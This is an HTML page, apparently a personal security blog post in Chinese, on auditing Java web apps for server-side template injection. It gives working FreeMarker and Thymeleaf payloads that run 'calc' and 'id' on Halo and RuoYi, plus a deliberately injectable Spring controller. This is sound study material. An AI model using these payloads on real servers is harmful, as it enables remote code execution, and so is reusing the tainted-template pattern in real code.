@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ssti模版注入 SSTI模版注入1、找项目中是否存在模版引擎（类型及安全问题） 2、找模版注入利用入口条件（根据网上已知漏洞复现条件） 3、找可控地方进行测试检测（根据网上已知漏洞利用条件） 常见模版说明：见上图参考来源： https:&#x2F;&#x2F;github.com&#x2F;Pav-ksd-pl&#x2F;websitesVulnerableToSSTI 黑盒中建议判断利用：见70天内容 https:&#x2F;&#x2F;github.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java代码审计-ssti">
+<meta property="og:url" content="https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="ssti模版注入 SSTI模版注入1、找项目中是否存在模版引擎（类型及安全问题） 2、找模版注入利用入口条件（根据网上已知漏洞复现条件） 3、找可控地方进行测试检测（根据网上已知漏洞利用条件） 常见模版说明：见上图参考来源： https:&#x2F;&#x2F;github.com&#x2F;Pav-ksd-pl&#x2F;websitesVulnerableToSSTI 黑盒中建议判断利用：见70天内容 https:&#x2F;&#x2F;github.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719904482502-73be4bb6-db76-4eff-8faf-3c55f54f9317.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719905283947-33b397a1-0d27-4b25-926c-d331871e9be4.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719935749356-1ba9881d-2fef-4518-8acb-132b6db9631b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719936427498-5bfb75a0-6599-46e7-97a0-2f4fb2caa7c1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719936716866-2500c079-60cf-43f0-b41a-e34b7df34925.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719937509744-955f6b65-b66e-46a9-b399-0cb8861b1c30.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938239847-b8274432-ddf6-4609-8244-fc0c4bb49b5b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938182916-a8edd387-5018-4733-8455-f89b8ff679be.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938560525-c5051e71-ad99-42a4-98ac-c19fa5a7dbae.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938578695-53b92c98-b1cb-49b0-8e09-1e901cd322b0.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938966749-87c16d50-111e-416c-8ca9-54172198c0a1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719942427497-3672562f-26ab-4bdc-a482-9350cd5b41a5.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719942417887-6849b494-23d8-4bba-929c-7eab028a512c.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719942394550-eb85234a-bd0c-45c1-91cd-1d0ce7c00b87.png">
+<meta property="article:published_time" content="2024-11-05T14:51:29.000Z">
+<meta property="article:modified_time" content="2024-12-30T11:26:03.764Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719904482502-73be4bb6-db76-4eff-8faf-3c55f54f9317.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>java代码审计-ssti</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%B0%84(2)/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%B0%84(1)/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&text=java代码审计-ssti"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&title=java代码审计-ssti"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&is_video=false&description=java代码审计-ssti"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=java代码审计-ssti&body=Check out this article: https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&title=java代码审计-ssti"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&title=java代码审计-ssti"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&title=java代码审计-ssti"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&title=java代码审计-ssti"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&name=java代码审计-ssti&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&t=java代码审计-ssti"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">ssti模版注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">SSTI模版注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%A8%A1%E7%89%88%E8%AF%B4%E6%98%8E%EF%BC%9A%E8%A7%81%E4%B8%8A%E5%9B%BE"><span class="toc-number">1.1.1.</span> <span class="toc-text">常见模版说明：见上图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaEE%E5%AE%A1%E8%AE%A1-CheckList"><span class="toc-number">1.1.2.</span> <span class="toc-text">JavaEE审计-CheckList</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeMarker-Halo"><span class="toc-number">1.1.3.</span> <span class="toc-text">#FreeMarker Halo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thymeleaf-Ruoyi"><span class="toc-number">1.1.4.</span> <span class="toc-text">#Thymeleaf Ruoyi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jeecg-Xxe-XSteam"><span class="toc-number">1.1.5.</span> <span class="toc-text">#Jeecg-Xxe&amp;XSteam</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Halo-RCE-SSRF"><span class="toc-number">1.1.6.</span> <span class="toc-text">#Halo- RCE&amp;SSRF</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        java代码审计-ssti
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-05T14:51:29.000Z" class="dt-published" itemprop="datePublished">2024-11-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web/" rel="tag">web</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="ssti模版注入"><a href="#ssti模版注入" class="headerlink" title="ssti模版注入"></a>ssti模版注入</h1><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719904482502-73be4bb6-db76-4eff-8faf-3c55f54f9317.png"></p>
+<h2 id="SSTI模版注入"><a href="#SSTI模版注入" class="headerlink" title="SSTI模版注入"></a>SSTI模版注入</h2><p>1、找项目中是否存在模版引擎（类型及安全问题）</p>
+<p>2、找模版注入利用入口条件（根据网上已知漏洞复现条件）</p>
+<p>3、找可控地方进行测试检测（根据网上已知漏洞利用条件）</p>
+<h3 id="常见模版说明：见上图"><a href="#常见模版说明：见上图" class="headerlink" title="常见模版说明：见上图"></a>常见模版说明：见上图</h3><p>参考来源：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Pav-ksd-pl/websitesVulnerableToSSTI">https://github.com/Pav-ksd-pl/websitesVulnerableToSSTI</a></p>
+<p>黑盒中建议判断利用：见70天内容</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vladko312/SSTImap">https://github.com/vladko312/SSTImap</a></p>
+<h3 id="JavaEE审计-CheckList"><a href="#JavaEE审计-CheckList" class="headerlink" title="JavaEE审计-CheckList"></a>JavaEE审计-CheckList</h3><p>1、功能点-见上图</p>
+<p>2、搜索点-见链接</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw">https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/COXCjMItvrcOCNcqEfbmDg">https://mp.weixin.qq.com/s/COXCjMItvrcOCNcqEfbmDg</a></p>
+<p>（1）国产软件</p>
+<p>[泛微Ecology] 代码审计、安装说明</p>
+<p>[致远Seeyon] 代码审计、补丁问题</p>
+<p>[用友NC] 代码审计与环境搭建</p>
+<p>[蓝凌Landray] 代码审计与环境搭建</p>
+<p>[泛微E-Office] 代码审计与环境搭建</p>
+<p>[帆软报表] 代码审计与环境搭建</p>
+<p>[拓尔思TRS 内容协作平台WCM] 代码审计与环境搭建</p>
+<p>[通达OA] 代码审计与环境搭建</p>
+<p>[Smartbi] 代码审计与环境搭建</p>
+<p>[RuoYi若依] 代码审计</p>
+<p>[金山终端安全系统] 代码审计</p>
+<p>[慧点OA] 代码审计</p>
+<p>[浙大恩特客户资源管理系统] 代码审计</p>
+<p>[企望制造ERP] 代码审计</p>
+<p>（2）常见组件</p>
+<p>[ThinkPHP] 代码审计</p>
+<p>[Struts2] 漏洞环境下载、OGNL POC、漏洞分析</p>
+<p>[XStream] 审计特点与POC分析</p>
+<p>[NexusRepositoryManager] 代码审计与环境搭建</p>
+<p>（3）Server</p>
+<p>Jetty</p>
+<p>Nginx</p>
+<p>Tomcat</p>
+<p>WebLogic</p>
+<p>JBoss</p>
+<p>TongWeb</p>
+<p>PrimetonPAS</p>
+<p>（4）数据库</p>
+<p>mssql</p>
+<p>mysql</p>
+<p>H2 Database</p>
+<p>CouchDB</p>
+<p>ApacheSolr</p>
+<p>ElasticSearch</p>
+<p>InfluxDB</p>
+<p>ApacheDruid</p>
+<h3 id="FreeMarker-Halo"><a href="#FreeMarker-Halo" class="headerlink" title="#FreeMarker Halo"></a>#FreeMarker Halo</h3><p>freemarker-&gt;模板-&gt;admin&#x2F;themes&#x2F;editor-&gt;.ftl</p>
+<p>&lt;#assign value&#x3D;”freemarker.template.utility.Execute”?</p>
+<p>new()&gt;${value(“calc.exe”)}</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719905283947-33b397a1-0d27-4b25-926c-d331871e9be4.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719935749356-1ba9881d-2fef-4518-8acb-132b6db9631b.png"></p>
+<p>往index.ftl里面插入payload</p>
+<p>&lt;#assign value&#x3D;”freemarker.template.utility.Execute”?new()&gt; ${value(“calc.exe”)}</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719936427498-5bfb75a0-6599-46e7-97a0-2f4fb2caa7c1.png"></p>
+<p>插入点</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719936716866-2500c079-60cf-43f0-b41a-e34b7df34925.png"></p>
+<h3 id="Thymeleaf-Ruoyi"><a href="#Thymeleaf-Ruoyi" class="headerlink" title="#Thymeleaf Ruoyi"></a>#Thymeleaf Ruoyi</h3><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826</a></p>
+<p>Thymeleaf-&gt;return 可控变量-&gt;getNames-&gt;fragment-&gt;缓存监控</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> java.util.<span class="title function_ invoke__">Scanner</span>(<span class="title function_ invoke__">T</span>(java.lang.Runtime).<span class="title function_ invoke__">getRuntime</span>().<span class="title function_ invoke__">exec</span>(<span class="string">&quot;id&quot;</span>).<span class="title function_ invoke__">getInputStream</span>()).<span class="title function_ invoke__">next</span>()&#125;__::.x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719937509744-955f6b65-b66e-46a9-b399-0cb8861b1c30.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">GetMapping</span>(<span class="string">&quot;/path&quot;</span>)</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_ invoke__">path</span>(@RequestParam String lang) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938239847-b8274432-ddf6-4609-8244-fc0c4bb49b5b.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938182916-a8edd387-5018-4733-8455-f89b8ff679be.png"></p>
+<p>抓包分析一下<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938560525-c5051e71-ad99-42a4-98ac-c19fa5a7dbae.png"></p>
+<p>点击一下刷新按钮抓包。</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938578695-53b92c98-b1cb-49b0-8e09-1e901cd322b0.png"></p>
+<p>注入参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> java.util.<span class="title function_ invoke__">Scanner</span>(<span class="title function_ invoke__">T</span>(java.lang.Runtime).<span class="title function_ invoke__">getRuntime</span>().<span class="title function_ invoke__">exec</span>(<span class="string">&quot;calc&quot;</span>).<span class="title function_ invoke__">getInputStream</span>()).<span class="title function_ invoke__">next</span>()&#125;__::.x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938966749-87c16d50-111e-416c-8ca9-54172198c0a1.png"></p>
+<h3 id="Jeecg-Xxe-XSteam"><a href="#Jeecg-Xxe-XSteam" class="headerlink" title="#Jeecg-Xxe&amp;XSteam"></a>#Jeecg-Xxe&amp;XSteam</h3><p>xml比较少，逐渐被json取代</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/5hYQQBRhdoU5yxXMsDmClA">https://mp.weixin.qq.com/s/5hYQQBRhdoU5yxXMsDmClA</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719942427497-3672562f-26ab-4bdc-a482-9350cd5b41a5.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719942417887-6849b494-23d8-4bba-929c-7eab028a512c.png"></p>
+<p>使用了第三方组件SAXReader，默认的解析方法会出现XXE 漏洞，接着查找相应控制层的代码，是否调用了该方法</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719942394550-eb85234a-bd0c-45c1-91cd-1d0ce7c00b87.png"></p>
+<h3 id="Halo-RCE-SSRF"><a href="#Halo-RCE-SSRF" class="headerlink" title="#Halo- RCE&amp;SSRF"></a>#Halo- RCE&amp;SSRF</h3><p>RuntimeUtil-&gt;remoteAddr-&gt;admin&#x2F;themes&#x2F;clone-&gt;在线拉取主题</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">ssti模版注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">SSTI模版注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%A8%A1%E7%89%88%E8%AF%B4%E6%98%8E%EF%BC%9A%E8%A7%81%E4%B8%8A%E5%9B%BE"><span class="toc-number">1.1.1.</span> <span class="toc-text">常见模版说明：见上图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaEE%E5%AE%A1%E8%AE%A1-CheckList"><span class="toc-number">1.1.2.</span> <span class="toc-text">JavaEE审计-CheckList</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeMarker-Halo"><span class="toc-number">1.1.3.</span> <span class="toc-text">#FreeMarker Halo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thymeleaf-Ruoyi"><span class="toc-number">1.1.4.</span> <span class="toc-text">#Thymeleaf Ruoyi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jeecg-Xxe-XSteam"><span class="toc-number">1.1.5.</span> <span class="toc-text">#Jeecg-Xxe&amp;XSteam</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Halo-RCE-SSRF"><span class="toc-number">1.1.6.</span> <span class="toc-text">#Halo- RCE&amp;SSRF</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&text=java代码审计-ssti"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&title=java代码审计-ssti"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&is_video=false&description=java代码审计-ssti"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=java代码审计-ssti&body=Check out this article: https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&title=java代码审计-ssti"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&title=java代码审计-ssti"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&title=java代码审计-ssti"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&title=java代码审计-ssti"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&name=java代码审计-ssti&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/11/05/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/ssti/&t=java代码审计-ssti"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
